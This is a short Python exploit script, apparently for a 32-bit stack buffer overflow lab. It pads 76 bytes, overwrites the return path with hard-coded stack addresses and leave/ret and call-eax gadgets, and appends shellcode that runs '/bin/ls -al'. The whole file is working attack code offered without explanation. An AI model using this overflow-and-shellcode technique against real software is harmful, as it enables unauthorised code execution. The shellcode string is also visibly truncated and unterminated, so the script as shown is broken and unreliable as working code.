import struct

def p(addr):
        return struct.pack("I",addr)


junk = "A"*76

# pop eax,pop ebx,leave,return --- 0x804835f --> ret address
# 0x804835c

# leave = mov esp,ebp;ret
ret = p(0x804835c)
calleax = p(0x804847f)


#34
shellcode = "\x31\xc0\x50\x68\x2d\x61\x6c\x68\x89\xe5\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x55\x53\x89\xe1\x89\xc2\xb0$


nops = "\x90"*4


print   junk + p(0xbffffce0) + ret + p(0xbffffce8) + calleax + 'BBBB' + shellcode
